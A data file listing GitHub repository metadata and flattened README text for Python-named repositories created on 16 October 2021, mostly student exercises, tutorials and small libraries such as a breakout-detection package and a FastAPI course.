417913309;-AlgorithmsPython-;https://github.com/Vlasov-EV1994/-AlgorithmsPython-;;2021-10-16T18:26:20Z;0;0;0;-Python.- 
417956847;gopos-python;https://github.com/thepieterdc/gopos-python;Python;2021-10-16T21:50:21Z;0;0;0;gopos-python Python bindings for gopos (https://github.com/thepieterdc/gopos) 
417968259;PYTHON-CHAT;https://github.com/DutyServeUnion/PYTHON-CHAT;Python;2021-10-16T23:01:32Z;0;0;0;PYTHON-CHAT OMG GUYS PYTHONG HACKER CHAT!111!!!! (my last python project I swear) I think you put both python files together idk lol ( I NEVER TESTED THIS ! 😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧😧 
417956825;python-scripts;https://github.com/mburica/python-scripts;Python;2021-10-16T21:50:16Z;0;0;0;python-scripts Bunch of random Python scripts to do stuff I need from time to time 
417958222;exercice_python;https://github.com/fatima-dia/exercice_python;;2021-10-16T21:58:29Z;0;0;0;exercice_python 
417951953;python-project;https://github.com/lorenzo3117/python-project;Python;2021-10-16T21:24:24Z;0;0;0;
417953145;ZaeemPython;https://github.com/raki82932/ZaeemPython;Python;2021-10-16T21:31:08Z;0;0;0;
417916439;python-fastestmirror;https://github.com/Mani5GRockers/python-fastestmirror;Python;2021-10-16T18:40:21Z;0;0;0;
417905775;Advance_Python;https://github.com/RakeshG1/Advance_Python;Jupyter Notebook;2021-10-16T17:54:41Z;0;0;0;Advance_Python Advance_Python 
417889123;treinamento_python;https://github.com/adrianazaniol1/treinamento_python;Python;2021-10-16T16:48:15Z;0;0;0;"""# treinamento_python"" "
417942678;Robo_Python;https://github.com/guilhermeZorzam/Robo_Python;;2021-10-16T20:38:11Z;0;0;0;
417936598;python-challenge;https://github.com/Cheveboy/python-challenge;;2021-10-16T20:09:31Z;0;0;0;python-challenge 
417895021;python-learning;https://github.com/nsb413/python-learning;Python;2021-10-16T17:11:56Z;0;0;0;python-learning 
417956912;Python-projects;https://github.com/Siddhant0701/Python-projects;Python;2021-10-16T21:50:48Z;0;0;0;Python-projects 
417894847;Python-Automation;https://github.com/KayesFahim/Python-Automation;;2021-10-16T17:11:09Z;0;0;0;Python Automation 
417906569;python_examples;https://github.com/Brijesh1990/python_examples;Python;2021-10-16T17:57:55Z;0;0;0;python_examples python all examples 
417888326;breakout-python;https://github.com/ankane/breakout-python;C++;2021-10-16T16:44:59Z;0;0;0;Breakout Python 🔥 BreakoutDetection for Python Learn how it works  Installation Run: pip install breakout-detection Getting Started Detect breakouts in a time series from breakout import breakout  series = [100, 150, 136, ...] breakout(series) Options Pass options - default values below breakout(     series,     min_size=30,        # minimum observations between breakouts     method='multi',     # multi or amoc (at most one change)     degree=1,           # degree of the penalization polynomial (multi only)     beta=0.008,         # penalization term (multi only)     percent=None,       # minimum percent change in goodness of fit statistic (multi only)     alpha=2,            # weight of the distance between observations (amoc only)     exact=True          # exact or approximate median (amoc only) ) Credits This library uses the C++ code from the BreakoutDetection R package and is available under the same license. References  Leveraging Cloud Data to Mitigate User Experience from ‘Breaking Bad’  History View the changelog Contributing Everyone is encouraged to help improve this project. Here are a few ways you can help:  Report bugs Fix bugs and submit pull requests Write, clarify, or fix documentation Suggest or add new features  To get started with development: git clone https://github.com/ankane/breakout-python.git cd breakout-python pip install -r requirements.txt python setup.py install pytest 
417887949;Python-Class;https://github.com/stellagurin/Python-Class;Python;2021-10-16T16:43:31Z;0;0;0;Python-Class Little snippets of code 
417919117;Aprende_Python;https://github.com/abraham9999/Aprende_Python;;2021-10-16T18:52:59Z;0;0;0;
417904089;cursoPython;https://github.com/luispaulojr/cursoPython;Python;2021-10-16T17:47:38Z;0;0;0;cursoPython Curso de Python para instrutores do Senac 
417920279;Centria_Python;https://github.com/kosvi/Centria_Python;Python;2021-10-16T18:58:57Z;0;0;0;My Python exercises Inside directories are my solutions for the exercises. Exercises start with letter e followed by the exercise number. Bonus exercises start with letter b followed by exercise number.  Week 2 Week 3 Week 4 Week 5 Week 6  
417936477;python-challenge;https://github.com/bkct13/python-challenge;;2021-10-16T20:09:04Z;0;0;0;python-challenge 
417884740;GIt-Python;https://github.com/itzjaymzz/GIt-Python;Python;2021-10-16T16:30:16Z;0;0;0;#Git/Python #Testing My python abilities. 
417956118;python-library;https://github.com/dbleu/python-library;Python;2021-10-16T21:46:53Z;1;1;0;
417924613;LearningPython;https://github.com/creid-byte/LearningPython;Python;2021-10-16T19:17:56Z;0;0;0;
417896093;python_tasks;https://github.com/AnastasiosNomikos/python_tasks;Python;2021-10-16T17:16:12Z;0;0;0;
417907130;Python-Flask;https://github.com/olegator555/Python-Flask;Python;2021-10-16T18:00:10Z;0;0;0;
417897472;UE-Python;https://github.com/lgkula/UE-Python;;2021-10-16T17:21:29Z;0;0;0;UE-Python 
417912960;DSA_Python;https://github.com/phaneendhra-ch/DSA_Python;Python;2021-10-16T18:24:49Z;0;0;0;Data Structures and Algorithms in Python 
417915190;ProjetoPython;https://github.com/joaoviss/ProjetoPython;Python;2021-10-16T18:34:27Z;0;0;0;ProjetoPython- Projeto final da aula de Python do Projeto Talent Booster. Professora Julia Potratz. 
417921376;Aprendendo-Python;https://github.com/caioassis/Aprendendo-Python;Python;2021-10-16T19:03:34Z;0;0;0;Aprendendo-Python Repositório onde vou publicar alguns exercícios que eu resolvi enquanto estudava Python. 
417936473;python-challenge;https://github.com/bryanlowe/python-challenge;Python;2021-10-16T20:09:03Z;0;0;0;python-challenge The python challenges found here are examples of data analysis work 
417945990;Codility_python;https://github.com/Okeoma/Codility_python;Python;2021-10-16T20:53:59Z;1;1;0;Codility_python My Codility Solutions written in Python. All results gave 100% mark. 
417938593;Ardui-Python;https://github.com/cherifseye/Ardui-Python;C++;2021-10-16T20:18:42Z;0;0;0;
417965200;NTUE-Python;https://github.com/chsyu/NTUE-Python;Python;2021-10-16T22:40:15Z;0;0;0;
417895915;Python-2-Methods;https://github.com/jacobrhotchkiss/Python-2-Methods;Python;2021-10-16T17:15:29Z;0;0;0;CS 1440 Assignment 2: Big Data Processing Clone this repository and use it as a basis for your work.  Run each of these commands one-at-a-time, without the '$' (that represents your shell's prompt). Be sure to replace the words LAST, FIRST, and USERNAME with your own names. $ git clone git@gitlab.cs.usu.edu:erik.falor/cs1440-falor-erik-assn2 cs1440-LAST-FIRST-assn2 $ cd cs1440-LAST-FIRST-assn2 $ git remote rename origin old-origin $ git remote add origin git@gitlab.cs.usu.edu:USERNAME/cs1440-LAST-FIRST-assn2.git $ git push -u origin --all  Updated testing data sets Your program should produce the same output regardless of the order of the lines of the input files.  I have created instructions for new data sets to allow you to test that your program isn't affected by the order of its inputs. You can pull these instructions directly into your repo by running this command: $ git pull old-origin master  If you don't have my repo's URL configured under the name old-origin, you can run these commands instead: $ git remote add eriks-origin git@gitlab.cs.usu.edu:erik.falor/cs1440-falor-erik-assn2 $ git pull eriks-origin master   Instructions Hints Rubric Installing the Text Tools  Overview Your last project was a great success! The customer was very pleased with their new TextTools and so impressed with the quality of your work that they have decided to contract you to finish the entire project for them. Your task is to analyze a large body of data and produce a report of the findings.  This program summarizes national employment data collected by the U.S. Bureau of Labor Statistics in 2020.  The report consists of two sections, a summary across all industries and a summary across the software publishing industry.  I worked with the customer far enough to develop the format of the report.  It is your task to analyze a 493MB CSV file to pull out the data needed by the report. Objectives  Learn how to process a large body of data Using Python's built-in string operations Research programming documentation Reading, understanding, and following instructions Using advanced data structures (list, dictionary, set) Apply problem solving strategies  Divide the problem Reduce the problem Don't get frustrated   Exercise debugging techniques  Direct debugging with the IDE Indirect debugging Wolf-Fence debugging    Expected Behavior Each subfolder of data/ contains a file named output.txt. Your program's output for that data set should match that file exactly. Instructions for creating the testing data sets using the Text Tools from Assignment #1 are provided.  These crafted input files should form the basis of your verification procedure. 
417919530;Ara-kiralama-python;https://github.com/Aydntrlk/Ara-kiralama-python;;2021-10-16T18:55:19Z;0;0;0;
417913001;Exercise-Selection--Python;https://github.com/chill2711/Exercise-Selection--Python;Python;2021-10-16T18:25:01Z;0;0;0;Exercise-Selection--Python The user will select an indoor or outdoor activity. Each of these choices will give 3 exercise options for the selection. The user will select an exercise option, and a file with information about that exercise option will be presented to user. Be sure to have files with correct fileName in same folder as the program. 
417931162;CHAPTR-PYTHON-CHALLENGES;https://github.com/felix715/CHAPTR-PYTHON-CHALLENGES;Python;2021-10-16T19:48:02Z;0;0;0;CHAPTR-PYTHON-CHALLENGES This is a rock paper scissor game where the user inputs any character between 'r','p' and's' and the computer too.....whoever guesses the correct answer gets it right. .....i.e maybe the computer or the user will win the game. 
417886566;Order-Placing-System-Python;https://github.com/SyedaAnshrahGillani/Order-Placing-System-Python;Python;2021-10-16T16:37:28Z;0;0;0;
417888165;PYTHON-BASICS-TO-ADVANCE;https://github.com/jasleenkaur0609/PYTHON-BASICS-TO-ADVANCE;;2021-10-16T16:44:20Z;0;0;0;
417959381;Python-String-List;https://github.com/Nkwachi-Nlems/Python-String-List;Jupyter Notebook;2021-10-16T22:04:14Z;0;0;0;Python-String-List 
417972834;Curso-em-video-Python;https://github.com/DiogoConcerva/Curso-em-video-Python;Python;2021-10-16T23:33:47Z;0;0;0; Exercícios do canal curso em vídeo, módulo Python.  Link do curso: https://www.youtube.com/playlist?list=PLvE-ZAFRgX8hnECDn1v9HNTI71veL3oW0 
417895334;NewEDC_python;https://github.com/Gama92sanch/NewEDC_python;;2021-10-16T17:13:09Z;0;0;0;NewEDC_python Ejemplos para el curso de python 
417898281;Python_Selenium_Framework;https://github.com/RajeshRavichandran1906/Python_Selenium_Framework;Python;2021-10-16T17:24:36Z;0;0;0;
417881341;Python-GTPS-Controller-Bot;https://github.com/Lamp1337/Python-GTPS-Controller-Bot;;2021-10-16T16:16:28Z;1;1;0;Under Development 
417893403;nss-kennel-python-server;https://github.com/JoyceRuobingZhang/nss-kennel-python-server;Python;2021-10-16T17:05:28Z;0;0;0;
417953731;Python-Pre-Asssessment;https://github.com/CopperL2021/Python-Pre-Asssessment;Python;2021-10-16T21:34:14Z;0;0;0;Python-Pre-Asssessment A python pre-assessment in order to write a data set from a txt file into a csv data table. 
417952079;python-web-scraping-;https://github.com/webofiy/python-web-scraping-;;2021-10-16T21:25:04Z;0;0;0;python-web-scraping- 
417892739;Python-3-Wrestling-Sales;https://github.com/nikhilkalhan92/Python-3-Wrestling-Sales;HTML;2021-10-16T17:02:58Z;0;0;0; Welcome nikhilkalhan92, This is the Code Institute student template for deploying your third portfolio project, the Python command-line project. The last update to this file was: August 17, 2021 Reminders  Your code must be placed in the run.py file Your dependencies must be placed in the requirements.txt file Do not edit any of the other files or your code may not deploy properly  Creating the Heroku app When you create the app, you will need to add two buildpacks from the Settings tab. The ordering is as follows:  heroku/python heroku/nodejs  You must then create a Config Var called PORT. Set this to 8000 If you have credentials, such as in the Love Sandwiches project, you must create another Config Var called CREDS and paste the JSON into the value field. Connect your GitHub repository and deploy as normal. Constraints The deployment terminal is set to 80 columns by 24 rows. That means that each line of text needs to be 80 characters or less otherwise it will be wrapped onto a second line.  Happy coding! 
417881237;python-cheatsheet3;https://github.com/coktale/python-cheatsheet3;;2021-10-16T16:16:03Z;0;0;0;
417894573;FizzBuzz-Problem-Python;https://github.com/Shekswess/FizzBuzz-Problem-Python;Python;2021-10-16T17:10:02Z;0;0;0;FizzBuzz-Interview-Problem -This project is made for seeing different solutions to a simple problem. -The goal of this project is to make something simple but effective project. -The problem goes like this: Looping through numbers from 1 to 100, if the number is divisible by 3 then print Fizz if the number is divisible by 5 then print Buzz, if the number is divisible by 3 and 5 then print FizzBuzz and if the number is not divisible by 3 and 5 print the number. -Maybe this Project can be upgraded or better optimised but I'm satisfied. -To run the project you need to have python3 installed. You download the code and you open the folder where the code is using the command line. -I hope you like this project and find it helpful ! 
417904638;Basic_Bot_Python;https://github.com/HaiCuCai-00/Basic_Bot_Python;Python;2021-10-16T17:50:02Z;0;0;0;
417881318;rabbitmq-example-python;https://github.com/ferrerallan/rabbitmq-example-python;Python;2021-10-16T16:16:22Z;0;0;0;rabbitmq-example-python This project uses rabbitmq as a messenger service, creating a producer and a consumer in python, and running rabbit with docker Requirements An available docker installation on the host To reproduce the example, follow the steps below.  Start a rabbitmq service with docker, using the command: sudo docker run -d --hostname my-rabbit --name rabbit13 -p 8080:15672 -p 5672:5672 -p 25676:25676 rabbitmq:3-management Start the consumer service (consumer.py) Start the producer service (producer.py)  
417889575;Python-with-Machine-Learning;https://github.com/khyatidahiya08/Python-with-Machine-Learning;Jupyter Notebook;2021-10-16T16:50:24Z;0;0;0;Python-with-Machine-Learning 
417948144;python-logistic-regression;https://github.com/alexander-manley/python-logistic-regression;Python;2021-10-16T21:05:15Z;0;0;0;python-logistic-regression  Binary predictive classification via supervised machine learning  
417959989;Python-Pentest-Tools;https://github.com/CyberThulhu22/Python-Pentest-Tools;Python;2021-10-16T22:07:23Z;0;0;0;Python-Pentest-Tools Tools for Pentesting mainly written in Python (This project was started during a weekly workshop by Red Siege - All code within this repository is written by me)  🔭 Reconnaissance Tools GeoLocationIP.py -- (Author: CyberThulhu22 | Version: 0.1.0 | Language: Python 3.10) Locates information via an API call to https://ipgeolocation.io/ (https://api.ipgeolocation.io/) using an IP Address or List of IP Addresses  
417921990;web-scraping-with-python-;https://github.com/webofiy/web-scraping-with-python-;;2021-10-16T19:06:22Z;0;0;0;web-scraping-with-python- 
417924604;hacker_solution_python;https://github.com/atul-568/hacker_solution_python;Python;2021-10-16T19:17:54Z;0;0;0;
417912520;ExamenFinalPython;https://github.com/jheysonvelap/ExamenFinalPython;;2021-10-16T18:22:43Z;0;0;0;ExamenFinalPython Este repositorio contiene archivos del examen final 
417970680;Python-para-Datascience;https://github.com/StephaneMenezes/Python-para-Datascience;Jupyter Notebook;2021-10-16T23:17:29Z;0;0;0;Python-para-Datascience Segue em anexo um estudo feito sobre Python para DataScience! 
417884922;BrainFlow-Python;https://github.com/KyleAlsburyNealy/BrainFlow-Python;Jupyter Notebook;2021-10-16T16:30:59Z;0;0;0;BrainFlow-Python Python scripts for running BrainFlow 
417887458;Printing-SudukoBoard-Python;https://github.com/SyedaAnshrahGillani/Printing-SudukoBoard-Python;Python;2021-10-16T16:41:21Z;0;0;0;
417930643;pythonic-garage-band;https://github.com/majedalswaeer/pythonic-garage-band;Python;2021-10-16T19:45:26Z;0;0;0;
417914018;ExamenFinalPython;https://github.com/JesusB06/ExamenFinalPython;;2021-10-16T18:29:17Z;0;0;0;ExamenFinalPython Repositorio del examen final 
417948631;Calculadora-Python-B-sica-;https://github.com/LucasHanchop/Calculadora-Python-B-sica-;Python;2021-10-16T21:07:53Z;0;0;0;
417909978;tutorial-api-python;https://github.com/MieleSantos/tutorial-api-python;Python;2021-10-16T18:11:22Z;0;0;0;"Construindo API's robustas utilizando Python Tutorial 16 da Python Brasil 2021  Ministrante: Luizalabs (facilitador: Cassio Botaro) Neste tutorial vamos aprender a construir API's utilizando Python e FastAPI, integrá-las a serviços externos e também a como torná-las robustas. Discutiremos a importância de uma boa documentação e testes. Abordaremos conceitos como integração com serviços externos, integração contínua e testes automatizados. Analisaremos cenários onde precisaremos de uma melhor performance e algumas técnicas para alcançar este objetivo como chamadas a funções assíncronas. Vamos tentar nos preparar para situações ruins que possam acontecer e garantir que nosso sistema será resiliente. Tópicos abordados  Integração com serviços externos Integração contínua Testes automatizados Invocação de processos assíncronos Circuit breaker Compartilhamento de memória  O que será desenvolvido? Será desenvolvido um sistema com objetivo de obter informações a respeito de pedidos. Os pedidos serão obtidos através de integração com o sistema de pedidos do Magalu. Vamos fazer o enriquecimento desta informação antes de sua exibição e também iremos prover alguns dados estatísticos sobre o pedido. Um pedido possui vários pacotes, cada um deles contendo itens. Este sistema deve seguir as seguintes regras:  Deve apresentar uma interface que possa ser consumida tanto por um website, quanto por um aplicativo para dispositivos móveis; Deve prover um endpoint que indique a saúde do sistema; Dado um pedido, retornar os seus itens; Os itens de um pedido devem conter um identificador (sku), uma descrição, uma imagem, uma referência e a quantidade; Exibir um relatório com o total de métodos de pagamento utilizados nos últimos 30 pedidos; Dado um pedido (vários itens), enriquecer a informação com as informações de gtin (global trade item number). Deve ser retornado também a marca, descrição e - identificação do produto; Como será consumido por terceiros deve apresentar boa documentação; O sistema deve estar preparado para receber novas funcionalidades, garantindo qualidade a cada entrega; O sistema deve apresentar testes.  Ferramentas Python FastApi Poetry Para testa, basta roda o comando: uvicorn --reload api_pedidos.api:app. "
417903999;MyPythonLibrary;https://github.com/MohamedAliHamza/MyPythonLibrary;;2021-10-16T17:47:17Z;0;0;0;MyPythonLibrary 
417884047;python_cloudflare_ddns;https://github.com/mathiasfrohlich/python_cloudflare_ddns;;2021-10-16T16:27:18Z;0;0;0;python_cloudflare_ddns Simple Python code for updating Dynamic DNS with Cloudflare 
417926884;python-3.6.1;https://github.com/purplesmurfette/python-3.6.1;;2021-10-16T19:27:43Z;0;0;0;"This is Python version 3.6.1    Copyright (c) 2001, 2002, 2003, 2004, 2005, 2006, 2007, 2008, 2009, 2010, 2011, 2012, 2013, 2014, 2015, 2016, 2017 Python Software Foundation.  All rights reserved. See the end of this file for further copyright and license information.  General Information  Website: https://www.python.org Source code: https://github.com/python/cpython Issue tracker: https://bugs.python.org Documentation: https://docs.python.org Developer's Guide: https://docs.python.org/devguide/   Contributing to CPython For more complete instructions on contributing to CPython development, see the Developer Guide.  Using Python Installable Python kits, and information about using Python, are available at python.org.  Build Instructions On Unix, Linux, BSD, macOS, and Cygwin: ./configure make make test sudo make install  This will install Python as python3. You can pass many options to the configure script; run ./configure --help to find out more.  On macOS and Cygwin, the executable is called python.exe; elsewhere it's just python. On macOS, if you have configured Python with --enable-framework, you should use make frameworkinstall to do the installation.  Note that this installs the Python executable in a place that is not normally on your PATH, you may want to set up a symlink in /usr/local/bin. On Windows, see PCbuild/readme.txt. If you wish, you can create a subdirectory and invoke configure from there. For example: mkdir debug cd debug ../configure --with-pydebug make make test  (This will fail if you also built at the top-level directory.  You should do a make clean at the toplevel first.) To get an optimized build of Python, configure --enable-optimizations before you run make.  This sets the default make targets up to enable Profile Guided Optimization (PGO) and may be used to auto-enable Link Time Optimization (LTO) on some platforms.  For more details, see the sections below.  Profile Guided Optimization PGO takes advantage of recent versions of the GCC or Clang compilers.  If ran, make profile-opt will do several steps. First, the entire Python directory is cleaned of temporary files that may have resulted in a previous compilation. Then, an instrumented version of the interpreter is built, using suitable compiler flags for each flavour. Note that this is just an intermediary step and the binary resulted after this step is not good for real life workloads, as it has profiling instructions embedded inside. After this instrumented version of the interpreter is built, the Makefile will automatically run a training workload. This is necessary in order to profile the interpreter execution. Note also that any output, both stdout and stderr, that may appear at this step is suppressed. Finally, the last step is to rebuild the interpreter, using the information collected in the previous one. The end result will be a Python binary that is optimized and suitable for distribution or production installation.  Link Time Optimization Enabled via configure's --with-lto flag.  LTO takes advantage of the ability of recent compiler toolchains to optimize across the otherwise arbitrary .o file boundary when building final executables or shared libraries for additional performance gains.  What's New We have a comprehensive overview of the changes in the What's New in Python 3.6 document.  For a more detailed change log, read Misc/NEWS, but a full accounting of changes can only be gleaned from the commit history. If you want to install multiple versions of Python see the section below entitled ""Installing multiple versions"".  Documentation Documentation for Python 3.6 is online, updated daily. It can also be downloaded in many formats for faster access.  The documentation is downloadable in HTML, PDF, and reStructuredText formats; the latter version is primarily for documentation authors, translators, and people with special formatting requirements. For information about building Python's documentation, refer to Doc/README.rst.  Converting From Python 2.x to 3.x Significant backward incompatible changes were made for the release of Python 3.0, which may cause programs written for Python 2 to fail when run with Python 3.  For more information about porting your code from Python 2 to Python 3, see the Porting HOWTO.  Testing To test the interpreter, type make test in the top-level directory.  The test set produces some output.  You can generally ignore the messages about skipped tests due to optional features which can't be imported.  If a message is printed about a failed test or a traceback or core dump is produced, something is wrong. By default, tests are prevented from overusing resources like disk space and memory.  To enable these tests, run make testall. If any tests fail, you can re-run the failing test(s) in verbose mode: make test TESTOPTS=""-v test_that_failed""  If the failure persists and appears to be a problem with Python rather than your environment, you can file a bug report and include relevant output from that command to show the issue.  Installing multiple versions On Unix and Mac systems if you intend to install multiple versions of Python using the same installation prefix (--prefix argument to the configure script) you must take care that your primary python executable is not overwritten by the installation of a different version.  All files and directories installed using make altinstall contain the major and minor version and can thus live side-by-side.  make install also creates ${prefix}/bin/python3 which refers to ${prefix}/bin/pythonX.Y.  If you intend to install multiple versions using the same prefix you must decide which version (if any) is your ""primary"" version.  Install that version using make install.  Install all other versions using make altinstall. For example, if you want to install Python 2.7, 3.5, and 3.6 with 3.6 being the primary version, you would execute make install in your 3.6 build directory and make altinstall in the others.  Issue Tracker and Mailing List Bug reports are welcome!  You can use the issue tracker to report bugs, and/or submit pull requests on GitHub. You can also follow development discussion on the python-dev mailing list.  Proposals for enhancement If you have a proposal to change Python, you may want to send an email to the comp.lang.python or python-ideas mailing lists for initial feedback.  A Python Enhancement Proposal (PEP) may be submitted if your idea gains ground. All current PEPs, as well as guidelines for submitting a new PEP, are listed at python.org/dev/peps/.  Release Schedule See PEP 494 for Python 3.6 release details.  Copyright and License Information Copyright (c) 2001, 2002, 2003, 2004, 2005, 2006, 2007, 2008, 2009, 2010, 2011, 2012, 2013, 2014, 2015, 2016 Python Software Foundation.  All rights reserved. Copyright (c) 2000 BeOpen.com.  All rights reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives.  All rights reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum.  All rights reserved. See the file ""LICENSE"" for information on the history of this software, terms & conditions for usage, and a DISCLAIMER OF ALL WARRANTIES. This Python distribution contains no GNU General Public License (GPL) code, so it may be used in proprietary projects.  There are interfaces to some GNU code but these are entirely optional. All trademarks referenced herein are property of their respective holders. "
417937348;montyPython-em-JAVA;https://github.com/Rafael-Javaro/montyPython-em-JAVA;Java;2021-10-16T20:12:58Z;0;0;0;"Gerador de frases do Monty Python Monty Python foi um dos grupos de comediantes mais influentes e reverenciados da história da TV. Vamos criar uma API para gerar frases aleatórias coletadas dos episódios da trupe, de acordo com nosso ator favorito. Tópicos Neste desafio você aprenderá:  Java Criar APIs Testar APIs Ler dados de um banco de dados Spring Boot JPA  Requisitos ​ Para este desafio você precisará de:  Java 8 (ou superior) Git  Detalhes Banco de dados H2 com uma tabela chamada scripts com a estrutura: CREATE TABLE IF NOT EXISTS ""scripts"" (   ""id"" INTEGER PRIMARY KEY,   ""episode"" INTEGER,   ""episode_name"" TEXT,   ""segment"" TEXT,   ""type"" TEXT,   ""actor"" TEXT,   ""character"" TEXT,   ""detail"" TEXT,   ""record_date"" TIMESTAMP,   ""series"" TEXT,   ""transmission_date"" TIMESTAMP ); CREATE INDEX ""ix_scripts_index""ON ""scripts"" (""index"");  Na coluna detail estão as frases que devem ser apresentadas pela API. Na coluna actor, consta o nome do ator. A API deve responder pelas seguintes URLs: /v1/quote Método: GET Retorna uma frase aleatória de qualquer ator. /v1/quote/{actor} Método: GET Retorna uma frase aleatória do ator passado como parâmetro. O formato esperado em ambas URLs é uma Response JSON: {""actor"":""John Cleese"",""quote"":""Yes, cigarettes. My hovercraft is full of eels.""} Rodando a aplicação Executar o comando gradlew bootRun A aplicação estará disponível em http://localhost:8080 "
417881807;ProgKorny_Python_Kivy;https://github.com/krigovszkibalint/ProgKorny_Python_Kivy;Python;2021-10-16T16:18:24Z;0;0;0;ProgKorny_Python_Kivy 
417973652;webscrapper-example-python;https://github.com/LucasSequeira/webscrapper-example-python;Python;2021-10-16T23:40:01Z;0;0;0;webscrapper-example-python 
417939180;python-api-challenge;https://github.com/shirinegm/python-api-challenge;Jupyter Notebook;2021-10-16T20:21:18Z;0;0;0;python-api-challenge Homework 6 Part I OpenWeatherMap API: Where do you request the API key? --Done Which Weather API in particular will you need? What URL endpoints does it expect? What JSON structure does it respond with? What is Citipy for? Why would you use it in conjunction with the OpenWeatherMap API? How would you do so? Part II 
417970764;Python-Automation-Tool;https://github.com/OmarShokeir/Python-Automation-Tool;Jupyter Notebook;2021-10-16T23:18:09Z;0;0;0;Python Automation Tool 
417935301;Bin2Dec-Python;https://github.com/jwesleylima/Bin2Dec-Python;Python;2021-10-16T20:04:01Z;0;0;0;"Bin2Dec-Python Uma função que converte dígitos binários para o sistema decimal de numeração. Como usar Não se preocupe com o formato ou com espaços, a função é capaz de manipular o que foi digitado para que tudo funcione corretamente. Atente-se que a função requer parâmetros de palavra-chave (keyword arguments). bin2dec(binary_digits='1100100') >>> 100 bin2dec(binary_digits='0110 0100') >>> 100 Além disso, em caso de erros, a função é bastante prestativa, pois analisa muitos fatores de erro internamento, facilitando na hora de tratar exceções. Entenda melhor analisando os exemplos à seguir: bin2dec(binary_digits='1234') >>> ValueError: Only binary digits (0 and 1) are allowed: ""1234"" entered No exemplo acima, vemos que a função lança uma exceção, o que de imediato quebraria o programa. Mas testar tudo digitado pelo usuário no seu próprio código seria meio verboso, por isso a função já testa e retorna exceções que o ajudam à informar seu usuário. Tratando exceções Usando o trecho de código abaixo, vamos exemplificar como a função lida com erros e o ajuda à tratá-los. from bin2dec import bin2dec   try:   bin_digit = str(input('bin: '))   print(bin2dec(binary_digits=bin_digit)) except Exception as e:   print(f'Sorry, something went wrong: {e}') Agora executando este módulo e inserindo bla bla na entrada, temos uma saída parecida com: >>> Sorry, something went wrong: Only binary digits (0 and 1) are allowed: ""blabla"" entered Sucesso Você viu que esta função pode ser útil quando queremos converter um conjunto de dígitos binários para a notaçao decimal de numeração. Fique à vontade para brincar com esta função, no entanto pesso que releia a licença. "
417945714;python-principle-component-analysis;https://github.com/alexander-manley/python-principle-component-analysis;Python;2021-10-16T20:52:27Z;0;0;0;python-principle-component-analysis Python PCA  Dimensionality reduction algorithm Cluster visualization Noise filtering and feature extraction  
417890475;simple_python_mvc;https://github.com/leandromaia/simple_python_mvc;Python;2021-10-16T16:54:17Z;0;0;0;simple_python_mvc It's a academic project used to demonstrate in the simplest way the  MVC pattern written in Python language. 
417897804;Python-Wk5Ws;https://github.com/Tyler-Pritchard/Python-Wk5Ws;;2021-10-16T17:22:48Z;0;0;0;Python-Wk5Ws 
417912121;Turtle-Project--Python;https://github.com/chill2711/Turtle-Project--Python;Python;2021-10-16T18:20:58Z;0;0;0;Turtle-Project--Python This program will write the letters CRH and exit on a click of the mouse from the user. 
417914837;Client-Socket-Communication--Python;https://github.com/chill2711/Client-Socket-Communication--Python;Python;2021-10-16T18:32:53Z;0;0;0;"Client-Socket-Communication--Python This program will have the client send messages to the server until the client says ""bye"". The server will respond with putting the message in capital letters. "
417907309;basic_python_code;https://github.com/Pallavi689/basic_python_code;Python;2021-10-16T18:00:49Z;0;0;0;
417955511;jarvis_python_telegram_bot;https://github.com/m4m6o/jarvis_python_telegram_bot;Python;2021-10-16T21:43:49Z;0;0;0;jarvis_python_telegram_bot telegram bot on python 
417930434;Data-Cleaning-using-Python;https://github.com/KGunjala/Data-Cleaning-using-Python;Jupyter Notebook;2021-10-16T19:44:22Z;0;0;0;DATA CLEANING USING PYTHON Cleaning a given unclean dataset using python's pandas and numpy libraries  Given an unclean dataset with columns containing :  non-standardised values missing data incorrect data types  we use the pandas library to clean the data and convert it into a processible format. The step by step guide for dealing with inconsistencies in each one of the target columns is included in the jupyter notebook in the form of markdown blocks.  
417971395;Python-Crash-Course-Exercises;https://github.com/shaynamurphy/Python-Crash-Course-Exercises;Python;2021-10-16T23:23:11Z;0;0;0;
417878308;CalculatorOnPython;https://github.com/BlackPinkFanboy/CalculatorOnPython;;2021-10-16T16:05:20Z;0;0;0;
417942051;Projeto-Dio-Pandas-Python;https://github.com/oliveirascof/Projeto-Dio-Pandas-Python;Jupyter Notebook;2021-10-16T20:35:05Z;0;0;0;Para este projeto foi utilizada a biblioteca Pandas, um framework Python de código aberto para análise de dados. Este framework nos dá capacidade de trabalhar com dados do tipo planilha, permitindo carregar, manipular e combinar dados rapidamente, entre outras funções, como plotar gráficos para apresentações. Conteúdos tratados nos notebooks:   Python Básico   Estrutura de dados   Introdução a Biblioteca Pandas   Trabalhando com arquivos em Excel   Trabalhando com Datas   Visualização de dados   Análise Exploratória de dados   Recursos utilizados:  Jupyter Notebook   Bibliotecas para visualização: Matplotlib e Seaborn.  Os datasets usados estão na pasta datasets Os gráficos estão na pasta (imagens) Os Arquivos criados estão na pasta de entrada principal 🚀 Vamos em FRENTE!!! 🚀 
417926355;DataStructuresPython;https://github.com/cesco345/DataStructuresPython;;2021-10-16T19:25:28Z;0;0;0;DataStructuresPython 
417893002;Python-Basic-To-Advance-;https://github.com/jasleenkaur0609/Python-Basic-To-Advance-;Jupyter Notebook;2021-10-16T17:04:03Z;0;0;0;Python-Basic-To-Advance- IN THIS RESPOSITORY, I WILL SHARE ALL  THE CONCEPTS RELATED TO PYTHON FROM BASIC LEVEL TO ADVANCE LEVEL. 
417902355;Notacao-Polonesa-Mips-Python-;https://github.com/ycarlosedu/Notacao-Polonesa-Mips-Python-;Python;2021-10-16T17:40:59Z;0;0;0;
417954768;python-random-quote;https://github.com/F320X/python-random-quote;Python;2021-10-16T21:39:47Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417956378;Stack-in-Python;https://github.com/alihps/Stack-in-Python;Python;2021-10-16T21:47:57Z;0;0;0;Stack-in-Python Python program to demonstrate stack implementation using a linked list and array 
